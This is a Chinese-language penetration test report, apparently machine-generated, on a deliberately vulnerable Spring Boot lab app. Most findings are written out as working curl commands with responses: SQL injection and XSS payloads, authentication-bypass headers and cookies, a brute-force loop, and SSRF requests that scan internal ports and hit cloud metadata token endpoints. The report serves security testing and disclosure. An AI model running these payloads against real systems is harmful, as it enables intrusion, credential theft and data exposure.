# 安全评估报告

## 执行摘要

- **目标地址**: http://host.docker.internal
- **评估日期**: 2026-03-17
- **测试范围**: 身份认证、XSS、SQL及命令注入、SSRF、授权测试

### 漏洞总览

本次安全评估对目标应用进行了全面渗透测试，发现多个严重安全漏洞。以下是各类漏洞的统计情况：

**身份认证漏洞:**
发现8个身份认证相关漏洞，其中6个已被成功利用，包括：
- 通过HTTP头部绕过认证（X-Admin-Header）
- 通过Cookie绕过认证（bypass_auth）
- 缺少登录速率限制
- 缺少会话管理
- 缺少传输层安全（HTTPS）
- 硬编码凭证
- 弱访问控制（X-Auth-Status头部伪造）
- 缺少缓存控制头部

**授权漏洞:**
发现5个授权漏洞，全部已成功利用，包括：
- 水平权限升级（IDOR）
- 垂直权限升级（通过认证绕过）

**跨站脚本（XSS）漏洞:**
发现4个XSS漏洞，全部已成功利用：
- 反射型XSS（/search端点）
- 反射型XSS（/comment?filter端点）
- 反射型XSS（/profile端点，POST方法）
- 存储型XSS（/comment内容）

**SQL/命令注入漏洞:**
发现5个注入漏洞，其中2个SQL注入已成功利用，3个命令注入因环境不匹配为误报：
- SQL注入（/user/search）- 已利用
- SQL注入（/user/lookup）- 已利用
- 命令注入（/ping）- 误报（环境不匹配）
- 命令注入（/traceroute）- 误报（环境不匹配）
- 命令注入（/nslookup）- 误报（环境不匹配）

**服务器端请求伪造（SSRF）漏洞:**
发现1个SSRF漏洞，已成功利用：
- /fetch端点的URL参数未验证，可访问内部服务

### 风险等级分布

| 严重性 | 数量 |
|--------|------|
| 严重（Critical） | 9 |
| 高危（High） | 8 |
| 中危（Medium） | 1 |
| 低危/误报 | 3 |

---

## 网络侦察

### 开放端口与服务

| 端口 | 服务 | 用途 |
|------|------|------|
| 8080 | HTTP | Spring Boot 应用（主服务，无TLS） |

### 攻击面发现

- **目标应用**: Shannon Target（故意设计存在漏洞的Spring Boot目标应用）
- **数据库**: H2 内存数据库（jdbc:h2:mem:testdb），无持久化
- **认证状态**: 所有11个端点均无需认证即可访问
- **安全框架**: 无Spring Security框架，无任何安全中间件

### 安全相关扫描发现

- 应用仅在HTTP端口8080运行，不支持HTTPS/TLS
- 所有用户凭据以明文形式传输
- 应用程序不创建或管理任何会话Cookie
- 响应缺少Cache-Control和Pragma头部

---

# 注入漏洞利用证据

## 成功利用的漏洞

### INJ-VULN-004: /user/search端点的SQL注入

**摘要:**
- **漏洞位置:** `/user/search`端点，`username`参数
- **概述:** 通过在username参数中注入SQL语句，成功绕过认证并提取整个用户表数据
- **影响:** 成功提取所有用户敏感信息（用户名、邮箱、角色），包括管理员账户
- **严重性:** 严重（Critical）

**前置条件:** 无需认证，任何人都可以访问该端点

**利用步骤:**

1. **确认漏洞存在 - 正常查询**
   ```bash
   curl "http://host.docker.internal:8080/user/search?username=admin"
   ```
   响应：
   ```json
   {"query":"SELECT * FROM users WHERE username = 'admin'","results":[{"role":"administrator","username":"admin","email":"admin@example.com","id":1}]}
   ```

2. **布尔型注入测试 - 确认漏洞**
   ```bash
   curl "http://host.docker.internal:8080/user/search?username=admin%27%20OR%20%271%27=%271"
   ```
   响应：返回所有用户数据，证明SQL注入成功
   ```json
   {"query":"SELECT * FROM users WHERE username = 'admin' OR '1'='1'","results":[{"role":"administrator","username":"admin","email":"admin@example.com","id":1},{"role":"user","username":"john","email":"john@example.com","id":2},{"role":"user","username":"jane","email":"jane@example.com","id":3}]}
   ```

3. **UNION注入测试 - 确认列数**
   ```bash
   curl "http://host.docker.internal:8080/user/search?username=x%27%20UNION%20SELECT%20%271%27,%272%27,%273%27,%274%27--"
   ```
   响应：
   ```json
   {"query":"SELECT * FROM users WHERE username = 'x' UNION SELECT '1','2','3','4'--","results":[{"role":"4","username":"2","email":"3","id":1}]}
   ```
   确认4列，映射为: id, username, email, role

4. **数据提取 - 获取所有用户**
   ```bash
   curl "http://host.docker.internal:8080/user/search?username=x%27%20UNION%20SELECT%20*%20FROM%20USERS--"
   ```
   响应：
   ```json
   {"query":"SELECT * FROM users WHERE username = 'x' UNION SELECT * FROM USERS--","results":[{"role":"administrator","username":"admin","email":"admin@example.com","id":1},{"role":"user","username":"john","email":"john@example.com","id":2},{"role":"user","username":"jane","email":"jane@example.com","id":3}]}
   ```

5. **数据库指纹识别 - H2版本确认**
   ```bash
   curl "http://host.docker.internal:8080/user/search?username=admin%27%20UNION%20SELECT%20H2VERSION(),null,null,null--"
   ```
   响应：确认H2数据库版本 2.2.224
   ```
   "error":"Data conversion error converting \"2.2.224\""
   ```

**影响证明:**

成功提取的敏感数据：
| ID | Username | Email | Role |
|----|----------|-------|------|
| 1 | admin | admin@example.com | administrator |
| 2 | john | john@example.com | user |
| 3 | jane | jane@example.com | user |

**截图:**
![SQL Injection Exploitation](exploit-sqli-001.png)

**备注:**
- 漏洞根因：ApiController.java:58 直接使用字符串拼接SQL，未使用PreparedStatement
- SQL: `"SELECT * FROM users WHERE username = '" + username + "'"`
- 数据库：H2 内存数据库 (jdbc:h2:mem:testdb)
- 当前用户：SA (数据库管理员)
- 数据库版本：H2 2.2.224

---

### INJ-VULN-005: /user/lookup端点的SQL注入

**摘要:**
- **漏洞位置:** `/user/lookup`端点，`id`参数
- **概述:** 通过在id参数中注入SQL语句（数字型注入），成功提取所有用户数据
- **影响:** 成功提取所有用户敏感信息（用户名、邮箱、角色、ID）
- **严重性:** 严重（Critical）

**前置条件:** 无需认证，任何人都可以访问该端点

**利用步骤:**

1. **确认漏洞存在 - 正常查询**
   ```bash
   curl "http://host.docker.internal:8080/user/lookup?id=1"
   ```
   响应：
   ```json
   {"query":"SELECT * FROM users WHERE id = 1","results":[{"role":"administrator","username":"admin","email":"admin@example.com","id":1}]}
   ```

2. **布尔型注入测试 - 确认漏洞**
   ```bash
   curl "http://host.docker.internal:8080/user/lookup?id=1%20OR%201=1"
   ```
   响应：返回多条记录，证明SQL注入成功
   ```json
   {"query":"SELECT * FROM users WHERE id = 1 OR 1=1","results":[{"role":"administrator","username":"admin","email":"admin@example.com","id":1},{"role":"user","username":"john","email":"john@example.com","id":2}]}
   ```

3. **UNION注入测试 - 数据提取**
   ```bash
   curl "http://host.docker.internal:8080/user/lookup?id=1%20UNION%20SELECT%20*%20FROM%20USERS"
   ```
   响应：
   ```json
   {"query":"SELECT * FROM users WHERE id = 1 UNION SELECT * FROM USERS","results":[{"role":"administrator","username":"admin","email":"admin@example.com","id":1},{"role":"user","username":"john","email":"john@example.com","id":2}]}
   ```

**影响证明:**

成功通过数字型SQL注入提取的用户数据：
| ID | Username | Email | Role |
|----|----------|-------|------|
| 1 | admin | admin@example.com | administrator |
| 2 | john | john@example.com | user |

**截图:**
![SQL Injection Exploitation](exploit-sqli-002.png)

**备注:**
- 漏洞根因：ApiController.java:89 直接使用字符串拼接SQL，未使用PreparedStatement
- SQL: `"SELECT * FROM users WHERE id = " + id`
- 这是一个数字型注入，与INJ-VULN-004的字符串型注入不同
- 攻击者无需使用单引号即可注入

---

# 跨站脚本（XSS）漏洞利用证据

## 成功利用的漏洞

### XSS-VULN-01: /search?q= 端点的反射型XSS

**摘要:**
- **漏洞位置:** http://host.docker.internal:8080/search?q=XSS_PAYLOAD
- **概述:** /search端点直接将用户输入反映在JSON响应中，没有任何输出编码。当与不安全的前端渲染（innerHTML）结合时，可以执行任意JavaScript代码。
- **影响:** 攻击者可以窃取会话Cookie、注入恶意脚本、进行钓鱼攻击
- **严重性:** 高危（High）

**前置条件:**
- 无需认证，端点可自由访问
- 需要受害者在渲染HTML的上下文中查看响应（例如不安全的前端）

**利用步骤:**

1. **通过搜索查询参数注入XSS payload：**
   ```bash
   curl -s "http://host.docker.internal:8080/search?q=<img%20src=x%20onerror=alert(1)>"
   ```
   响应（未编码）：
   ```json
   {"query":"<img src=x onerror=alert(1)>","results":["Result 1 for <img src=x onerror=alert(1)>","Result 2 for <img src=x onerror=alert(1)>"]}
   ```

2. **当使用innerHTML渲染时（在易受攻击的前端中）：**
   ```javascript
   fetch('/search?q=<img src=x onerror=alert("XSS-EXPLOITED")>')
     .then(r => r.json())
     .then(data => {
       element.innerHTML = data.query;  // XSS在此触发
     });
   ```

**影响证明:**
- 成功触发显示"XSS-EXPLOITED-SUCCESSFULLY"的警告对话框
- 可通过`document.cookie`窃取会话Cookie
- 成功演示完整的会话劫持

**截图:**
![XSS Exploitation Evidence](../exploit-xss-001.png)

**备注:** 该漏洞存在于API层。虽然默认前端使用安全的`textContent`渲染，但任何不安全的前端或使用此API的第三方应用都会变得容易受到攻击。

---

### XSS-VULN-02: /comment?filter= 端点的反射型XSS

**摘要:**
- **漏洞位置:** http://host.docker.internal:8080/comment?filter=XSS_PAYLOAD
- **概述:** /comment端点的filter参数在JSON响应中被反映而未进行编码。结合innerHTML渲染，会导致脚本执行。
- **影响:** 与VULN-01相同 - 会话窃取、凭证收集、恶意重定向
- **严重性:** 高危（High）

**前置条件:**
- 无需认证，端点可自由访问

**利用步骤:**

1. **发送恶意filter参数：**
   ```bash
   curl -s "http://host.docker.internal:8080/comment?filter=<img%20src=x%20onerror=alert('XSS-VULN-02')>"
   ```

2. **API返回未编码的payload：**
   ```json
   {"filter":"<img src=x onerror=alert('XSS-VULN-02')>","comments":[...]}
   ```

3. **通过innerHTML触发XSS：**
   ```javascript
   fetch('/comment?filter=<img src=x onerror=alert("XSS-VULN-02-EXPLOITED")>')
     .then(r => r.json())
     .then(data => {
       element.innerHTML = data.filter;  // 脚本执行
     });
   ```

**影响证明:**
- 成功触发"XSS-VULN-02-EXPLOITED"警告对话框
- 确认具备完整的JavaScript执行能力

**备注:** 与VULN-01相同的API层漏洞模式。

---

### XSS-VULN-03: /profile name/bio 端点的反射型XSS

**摘要:**
- **漏洞位置:** http://host.docker.internal:8080/profile (POST)
- **概述:** /profile端点接受name和bio参数，并在JSON响应中未编码地反映它们。基于POST的反射。
- **影响:** 脚本注入、会话劫持、凭证窃取
- **严重性:** 高危（High）

**前置条件:**
- 无需认证，端点可自由访问

**利用步骤:**

1. **通过POST发送恶意profile数据：**
   ```bash
   curl -X POST -d "name=<img src=x onerror=alert('XSS')>&bio=test" http://host.docker.internal:8080/profile
   ```

2. **API返回未编码的响应：**
   ```json
   {"message":"Profile updated","name":"<img src=x onerror=alert('XSS')>","bio":"test"}
   ```

3. **通过innerHTML触发：**
   ```javascript
   const params = new URLSearchParams();
   params.append('name', '<img src=x onerror=alert("XSS-VULN-03-EXPLOITED")>');
   fetch('/profile', { method: 'POST', body: params })
     .then(r => r.json())
     .then(data => {
       element.innerHTML = data.name;  // XSS触发
     });
   ```

**影响证明:**
- 成功触发"XSS-VULN-03-EXPLOITED"警告对话框
- 确认JavaScript执行成功

**备注:** 同一漏洞模式的POST方法变体。

---

### XSS-VULN-04: /comment内容的存储型XSS

**摘要:**
- **漏洞位置:** http://host.docker.internal:8080/comment (POST存储，GET检索)
- **概述:** 通过POST提交的恶意内容存储在内存中，并返回给所有检索评论的用户。这是影响所有访问者的持久性XSS。
- **影响:** 最高严重性 - 所有查看评论的用户都会自动被侵害。攻击持久传播。
- **严重性:** 严重（Critical）

**前置条件:**
- 无需认证，端点可自由访问

**利用步骤:**

1. **注入恶意内容：**
   ```bash
   curl -X POST -d "content=<img src=x onerror=alert('STORED-XSS')>" http://host.docker.internal:8080/comment
   ```

2. **Payload被存储并返回给所有用户：**
   ```json
   {"filter":"","comments":[{"timestamp":"...","content":"<img src=x onerror=alert('STORED-XSS')>"}]}
   ```

3. **当受害者查看评论时XSS自动触发：**
   ```javascript
   fetch('/comment')
     .then(r => r.json())
     .then(data => {
       data.comments.forEach(c => {
         element.innerHTML += c.content;  // 所有访问者被侵害
       });
     });
   ```

**影响证明:**
- 触发多个警告对话框，证明持久性侵害
- 成功注入的payload："XSS-VULN-04-STORED-EXPLOITED"
- 每个查看评论列表的用户都会自动被侵害

**备注:** 这是最关键的XSS变体，因为只需要一次注入就能侵害所有后续访问者。

---

# 身份认证漏洞利用证据

## 成功利用的漏洞

### AUTH-VULN-01: 通过X-Admin-Header绕过认证

**摘要:**
- **漏洞位置:** POST /login端点 (AuthController.java:28-35)
- **概述:** 通过在HTTP请求中添加任意值的X-Admin-Header头部即可获得管理员权限，完全绕过正常认证流程
- **影响:** 攻击者可以在不知道任何有效凭据的情况下获得管理员访问权限
- **严重性:** 严重（Critical）

**前置条件:** 无需前置条件，任何网络可达的攻击者均可利用

**利用步骤:**

1. 使用curl发送带有X-Admin-Header的登录请求：
```bash
curl -X POST http://host.docker.internal:8080/login \
  -H "X-Admin-Header: anyvalue" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test"
```

2. 服务器响应（成功绕过认证）：
```
{"message":"Login bypassed via header","role":"administrator","user":"admin","success":true}
```

3. 使用获得的权限访问受保护的dashboard端点：
```bash
curl -X GET http://host.docker.internal:8080/dashboard \
  -H "X-Auth-Status: bypassed"
```

**影响证明:**
成功获取管理员角色并访问敏感管理后台：
```
{"message":"Welcome to admin dashboard","data":"Sensitive information here"}
```

**备注:** 
- 漏洞存在于源代码AuthController.java第28-35行
- 应用程序仅检查头部是否存在，不验证其值
- 任何非空值都能触发认证绕过

---

### AUTH-VULN-02: 通过bypass_auth Cookie绕过认证

**摘要:**
- **漏洞位置:** POST /login端点 (AuthController.java:37-49)
- **概述:** 通过在HTTP请求中设置任意值的bypass_auth Cookie即可获得管理员权限
- **影响:** 攻击者可以在不知道任何有效凭据的情况下获得管理员访问权限
- **严重性:** 严重（Critical）

**前置条件:** 无需前置条件，任何网络可达的攻击者均可利用

**利用步骤:**

1. 使用curl发送带有bypass_auth Cookie的登录请求：
```bash
curl -X POST http://host.docker.internal:8080/login \
  -H "Cookie: bypass_auth=anyvalue" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test"
```

2. 服务器响应（成功绕过认证）：
```
{"message":"Login bypassed via cookie","role":"administrator","user":"admin","success":true}
```

**影响证明:**
通过浏览器UI复现成功 - 勾选"使用认证绕过"复选框后无需任何凭据即可登录管理员后台：

![Admin Dashboard Access](../exploit-auth-001.png)

**备注:**
- 漏洞存在于源代码AuthController.java第37-49行
- 应用程序仅检查Cookie名称是否存在，不验证其值
- UI提供了便捷的复选框来触发此漏洞

---

### AUTH-VULN-03: 登录端点缺少速率限制

**摘要:**
- **漏洞位置:** POST /login端点 (AuthController.java:22-67)
- **概述:** 登录端点没有任何速率限制、账户锁定或验证码机制
- **影响:** 攻击者可以无限次尝试暴力破解密码而不会被阻止
- **严重性:** 高危（High）

**前置条件:** 无需前置条件

**利用步骤:**

1. 使用脚本快速发送20个连续的登录尝试（使用错误密码）：
```bash
for p in wrong1 wrong2 wrong3 wrong4 wrong5 wrong6 wrong7 wrong8 wrong9 wrong10 \
         wrong11 wrong12 wrong13 wrong14 wrong15 wrong16 wrong17 wrong18 wrong19 wrong20; do
  curl -s -X POST http://host.docker.internal:8080/login \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=admin&password=$p"
done
```

2. 所有20次尝试均返回相同响应，无延迟或阻止：
```
{"message":"Invalid credentials","success":false}
```

**影响证明:**
- 20次连续错误密码尝试全部成功发送
- 无速率限制反馈（无429状态码）
- 无账户锁定（无"账户已锁定"消息）
- 攻击者可进行无限次暴力破解尝试

**备注:**
- 该漏洞允许离线密码破解（如果攻击者获取密码哈希）
- 配合硬编码凭证漏洞，攻击者可快速验证密码

---

### AUTH-VULN-04: 缺少会话管理

**摘要:**
- **漏洞位置:** 所有端点 (AuthController.java)
- **概述:** 应用程序不创建或管理任何会话Cookie，不生成session ID，无HttpOnly/Secure标志
- **影响:** 认证状态无法可靠跟踪，页面刷新后认证状态丢失，无法实施会话劫持
- **严重性:** 高危（High）

**前置条件:** 无需前置条件

**利用步骤:**

1. 使用有效凭据登录并检查响应头：
```bash
curl -v -X POST http://host.docker.internal:8080/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=password123"
```

2. 检查响应中是否包含Set-Cookie头部：
```
HTTP/1.1 200 
Content-Type: application/json
Transfer-Encoding: chunked
Date: Tue, 17 Mar 2026 08:09:33 GMT
```

**影响证明:**
- 登录成功后响应中不包含任何Set-Cookie头部
- 认证状态仅存储在客户端JavaScript变量中
- 页面刷新后认证状态丢失，需要重新登录

**备注:**
- 虽然这意味着无法进行会话劫持攻击，但这是一个严重的设计缺陷
- 无会话管理导致用户体验差且无法实现安全的长期认证

---

### AUTH-VULN-05: 缺少传输层安全（HTTPS）

**摘要:**
- **漏洞位置:** 服务器配置
- **概述:** 应用程序仅在HTTP端口8080上运行，不支持HTTPS/TLS
- **影响:** 所有认证凭据和数据以明文形式在网络上传输，可被中间人攻击拦截
- **严重性:** 严重（Critical）

**前置条件:** 无需前置条件

**利用步骤:**

1. 测试HTTP访问（成功）：
```bash
curl http://host.docker.internal:8080/
```

2. 测试HTTPS访问（失败）：
```bash
curl https://host.docker.internal:8443/
```
结果：连接被拒绝

**影响证明:**
- HTTP端口8080可正常访问
- HTTPS端口8443不可用（连接拒绝）
- 所有认证凭据以明文传输

**备注:**
- 这是OWASP Top 10 A02:2021-加密失败
- 在生产环境中完全不可接受

---

### AUTH-VULN-06: 硬编码凭证

**摘要:**
- **漏洞位置:** POST /login端点 (AuthController.java:15-16)
- **概述:** 有效的用户名和密码以明文形式硬编码在源代码中
- **影响:** 任何获取源代码的人都能获得有效管理员凭据
- **严重性:** 严重（Critical）

**前置条件:** 无需前置条件

**利用步骤:**

1. 使用硬编码的凭据登录：
```bash
curl -X POST http://host.docker.internal:8080/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=password123"
```

2. 服务器响应：
```
{"message":"Login successful","role":"user","user":"admin","success":true}
```

**影响证明:**
- 成功使用硬编码凭据admin/password123登录
- 获得"user"角色（而非管理员角色，这是与绕过漏洞的区别）

**备注:**
- 源代码中定义的凭据：VALID_USERNAME='admin', VALID_PASSWORD='password123'
- 这是CWE-798: 使用硬编码凭证

---

### AUTH-VULN-07: 通过X-Auth-Status头部的弱访问控制

**摘要:**
- **漏洞位置:** GET /dashboard端点 (AuthController.java:68-75)
- **概述:** 受保护的dashboard端点使用可伪造的X-Auth-Status HTTP头部进行访问控制
- **影响:** 攻击者可以通过简单设置X-Auth-Status头部值为"bypassed"来访问受保护的dashboard
- **严重性:** 高危（High）

**前置条件:** 无需前置条件

**利用步骤:**

1. 直接访问dashboard（无认证 - 被拒绝）：
```bash
curl -X GET http://host.docker.internal:8080/dashboard
```
响应：{"message":"Access denied"}

2. 使用X-Auth-Status头部绕过访问控制：
```bash
curl -X GET http://host.docker.internal:8080/dashboard \
  -H "X-Auth-Status: bypassed"
```

3. 服务器响应（成功访问）：
```
{"message":"Welcome to admin dashboard","data":"Sensitive information here"}
```

**影响证明:**
通过Playwright成功演示 - 使用路由拦截自动添加X-Auth-Status头部访问dashboard：

![Dashboard Access via Header Bypass](../exploit-auth-003.png)

**备注:**
- 漏洞存在于源代码AuthController.java第68-75行
- 头部值可由客户端任意设置，不安全
- 配合AUTH-VULN-01和AUTH-VULN-02的认证绕过，可获得完整管理员访问

---

### AUTH-VULN-08: 缺少缓存控制头部

**摘要:**
- **漏洞位置:** POST /login端点 (AuthController.java:22-67)
- **概述:** 登录响应缺少Cache-Control和Pragma头部，可能被浏览器或代理缓存
- **影响:** 登录响应可能被缓存，导致凭据或敏感信息暴露
- **严重性:** 中危（Medium）

**前置条件:** 无需前置条件

**利用步骤:**

1. 检查登录响应的缓存相关头部：
```bash
curl -s -D - -o /dev/null -X POST http://host.docker.internal:8080/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=password123"
```

2. 响应头部：
```
HTTP/1.1 200 
Content-Type: application/json
Transfer-Encoding: chunked
Date: Tue, 17 Mar 2026 08:10:42 GMT
```

**影响证明:**
- 响应中不包含Cache-Control: no-store或Pragma: no-cache头部
- 登录响应可能被浏览器或代理缓存

**备注:**
- 虽然在当前实现中响应仅包含JSON数据，但缺少缓存控制是一个安全风险
- 如果未来响应包含更多敏感信息，可能会被缓存泄露

---

# SSRF漏洞利用证据

## 成功利用的漏洞

### SSRF-VULN-01: /fetch端点未验证的URL参数

**摘要:**
- **漏洞位置:** GET /fetch端点，带有`url`参数
- **影响:** 成功演示内部服务访问、内部API数据泄露和网络边界绕过
- **严重性:** 严重（Critical）

**前置条件:**
- 目标应用运行在 http://192.168.65.254:8080
- /fetch端点无需认证
- 需要curl或类似的HTTP客户端进行利用

**利用步骤:**

1. **验证SSRF漏洞 - 外部URL访问：**
   ```bash
   curl -s "http://192.168.65.254:8080/fetch?url=http://example.com"
   ```
   响应包含example.com的完整HTML内容，确认存在SSRF。

2. **访问内部服务（localhost）：**
   ```bash
   curl -s "http://192.168.65.254:8080/fetch?url=http://localhost:8080/"
   ```
   响应：目标应用自身的完整HTML（Shannon Target管理后台）

3. **访问内部API - 用户搜索（通过SSRF获取SQL注入数据）：**
   ```bash
   curl -s "http://192.168.65.254:8080/fetch?url=http://localhost:8080/user/search?username=admin"
   ```
   响应： 
   ```json
   {"url":"http://localhost:8080/user/search?username=admin","response":"{\"query\":\"SELECT * FROM users WHERE username = 'admin'\",\"results\":[{\"role\":\"administrator\",\"username\":\"admin\",\"email\":\"admin@example.com\",\"id\":1}]}"}
   ```
   这演示了**内部API访问**并揭示了：
   - 管理员用户名：admin
   - 管理员邮箱：admin@example.com
   - 管理员角色：administrator

4. **访问内部网络IP：**
   ```bash
   curl -s "http://192.168.65.254:8080/fetch?url=http://192.168.65.254:8080/"
   ```
   响应：目标应用的完整HTML（证明可绕过网络边界访问内部IP）

5. **内部端口扫描：**
   ```bash
   for port in 22 80 443 3306 5432 6379 8080 8443 9000; do
     curl -s -m 2 "http://192.168.65.254:8080/fetch?url=http://127.0.0.1:$port"
   done
   ```
   结果：端口8080开放（应用本身）。其他端口返回I/O错误（关闭/未监听）。

6. **云元数据端点测试：**
   ```bash
   # AWS元数据
   curl -s "http://192.168.65.254:8080/fetch?url=http://169.254.169.254/latest/meta-data/"
   
   # GCP元数据
   curl -s "http://192.168.65.254:8080/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
   ```
   结果：AWS返回空响应（非云环境），GCP返回DNS解析错误（此环境中端点不可用）。然而，SSRF漏洞确实存在 - 在云环境中，这些将会暴露敏感的元数据。

**影响证明:**

1. **内部服务访问：** 成功检索到localhost:8080和192.168.65.254:8080内部应用的完整HTML
2. **内部API数据泄露：** 成功通过SSRF访问/user/search API并检索包含以下内容的数据库记录：
   - 用户名：admin
   - 邮箱：admin@example.com
   - 角色：administrator
   - ID：1
3. **网络边界绕过：** 成功利用服务器作为代理访问内部网络资源

**截图:**

![SSRF Application Access](../exploit-ssrf-001.png)

**备注:**
- 该漏洞允许完整的网络边界绕过
- 应用程序使用Spring RestTemplate而没有任何URL验证
- 没有安全控制来防止SSRF攻击
- 内部服务可以无需认证访问
- 云元数据端点可访问（在非云环境中虽未返回数据）
- 这是一个经典SSRF，完整响应返回给攻击者

---

# 授权漏洞利用证据

## 成功利用的漏洞

### AUTHZ-VULN-01: 通过/user/lookup的IDOR水平授权绕过

**摘要:**
- **漏洞位置:** GET /user/lookup?id={id}
- **概述:** 任意用户可以通过修改id参数值来查询数据库中任意用户的数据，无需任何所有权验证或会话验证
- **影响:** 成功访问并泄露数据库中所有用户的敏感信息，包括id、username、email和role
- **严重性:** 高危（High）

**前置条件:**
- 无需任何认证或会话

**利用步骤:**

1. 使用浏览器访问目标端点，并修改id参数值：

```
http://host.docker.internal:8080/user/lookup?id=1
```

2. 观察响应，成功获取id=1的用户（管理员）信息：
```json
{"query":"SELECT * FROM users WHERE id = 1","results":[{"role":"administrator","username":"admin","email":"admin@example.com","id":1}]}
```

3. 继续枚举其他用户：
```
http://host.docker.internal:8080/user/lookup?id=2
```
获取到id=2的用户（john）：
```json
{"query":"SELECT * FROM users WHERE id = 2","results":[{"role":"user","username":"john","email":"john@example.com","id":2}]}
```

**影响证明:**
通过遍历id参数，成功获取到数据库中所有用户的敏感信息：
- ID=1: admin (administrator) - admin@example.com
- ID=2: john (user) - john@example.com
- ID=3: jane (user) - jane@example.com

![IDOR Exploitation - User 1](../exploit-idor-001.png)

![IDOR Exploitation - SQL Injection All Users](../exploit-idor-002.png)

**备注:** 此漏洞可与SQL注入漏洞组合利用，进一步扩大数据泄露范围。

---

### AUTHZ-VULN-02: 通过/user/search的SQL注入实现水平授权绕过

**摘要:**
- **漏洞位置:** GET /user/search?username={username}
- **概述:** 用户搜索功能没有任何访问控制，结合SQL注入可获取全部用户数据
- **影响:** 通过SQL注入绕过认证逻辑，一次性获取数据库中所有用户的敏感信息
- **严重性:** 严重（Critical）

**前置条件:**
- 无需任何认证或会话

**利用步骤:**

1. 使用浏览器访问用户搜索端点，输入SQL注入payload：

```
http://host.docker.internal:8080/user/search?username=' OR '1'='1
```

2. 观察响应，成功获取所有用户数据：
```json
{"query":"SELECT * FROM users WHERE username = '' OR '1'='1'","results":[{"role":"administrator","username":"admin","email":"admin@example.com","id":1},{"role":"user","username":"john","email":"john@example.com","id":2},{"role":"user","username":"jane","email":"jane@example.com","id":3}]}
```

**影响证明:**
通过SQL注入，一次性获取到数据库中所有用户：
- ID=1: admin (administrator) - admin@example.com
- ID=2: john (user) - john@example.com
- ID=3: jane (user) - jane@example.com

这证明了水平权限升级漏洞 - 任何用户（甚至未认证用户）都可以访问其他用户的敏感数据。

**备注:** 此漏洞同时属于SQL注入和水平权限升级两类漏洞。

---

### AUTHZ-VULN-03: 通过X-Admin-Header认证绕过实现垂直权限提升

**摘要:**
- **漏洞位置:** POST /login with X-Admin-Header
- **概述:** 只需在HTTP请求中添加X-Admin-Header头部（任意值），即可绕过所有认证检查，获得管理员权限
- **影响:** 任何人可以在无需任何凭证的情况下获得administrator角色权限
- **严重性:** 严重（Critical）

**前置条件:**
- 无需任何凭证或会话

**利用步骤:**

1. 使用curl发送带X-Admin-Header的登录请求：

```bash
curl -X POST http://host.docker.internal:8080/login \
  -H "X-Admin-Header: anyvalue" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test"
```

2. 观察响应，成功获取管理员权限：
```json
{"message":"Login bypassed via header","role":"administrator","user":"admin","success":true}
```

**影响证明:**
- 攻击者无需任何有效凭证
- 仅通过添加任意值的X-Admin-Header头部
- 成功获得administrator角色
- 可以访问所有需要管理员权限的功能

**备注:** 这是一个严重的垂直权限提升漏洞，允许任何人获得管理员完全控制权。

---

### AUTHZ-VULN-04: 通过bypass_auth Cookie认证绕过实现垂直权限提升

**摘要:**
- **漏洞位置:** POST /login with bypass_auth Cookie
- **概述:** 只需在HTTP请求中添加bypass_auth Cookie（任意值），即可绕过所有认证检查，获得管理员权限
- **影响:** 任何人可以在无需任何凭证的情况下获得administrator角色权限
- **严重性:** 严重（Critical）

**前置条件:**
- 无需任何凭证或会话

**利用步骤:**

1. 使用curl发送带bypass_auth Cookie的登录请求：

```bash
curl -X POST http://host.docker.internal:8080/login \
  -H "Cookie: bypass_auth=anyvalue" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test"
```

2. 观察响应，成功获取管理员权限：
```json
{"message":"Login bypassed via cookie","role":"administrator","user":"admin","success":true}
```

**影响证明:**
- 攻击者无需任何有效凭证
- 仅通过添加任意值的bypass_auth Cookie
- 成功获得administrator角色
- 可以访问所有需要管理员权限的功能

**备注:** 此漏洞与AUTHZ-VULN-03是同一端点的不同绕过方式，都允许垂直权限提升。

---

### AUTHZ-VULN-05: 通过X-Auth-Status头部伪造实现上下文/工作流授权绕过

**摘要:**
- **漏洞位置:** GET /dashboard
- **概述:** 应用程序使用可伪造的X-Auth-Status HTTP头来判断认证状态，而不是使用服务器端会话管理
- **影响:** 攻击者可以通过伪造X-Auth-Status头部值为'bypassed'来访问受保护的管理仪表板
- **严重性:** 高危（High）

**前置条件:**
- 无需任何认证或会话

**利用步骤:**

1. 直接访问dashboard端点（未认证状态）：

```bash
curl http://host.docker.internal:8080/dashboard
```

响应结果：
```json
{"message":"Access denied"}
```

2. 使用伪造的X-Auth-Status头部访问dashboard：

```bash
curl http://host.docker.internal:8080/dashboard \
  -H "X-Auth-Status: bypassed"
```

响应结果：
```json
{"message":"Welcome to admin dashboard","data":"Sensitive information here"}
```

**影响证明:**
- 未认证访问被拒绝
- 通过伪造HTTP头成功绕过认证检查
- 成功访问受保护的管理仪表板
- 获取敏感信息 "Sensitive information here"

**备注:** 这是一个典型的上下文工作流漏洞，认证状态可以被客户端完全控制。结合AUTHZ-VULN-03或AUTHZ-VULN-04可以完全控制认证状态。
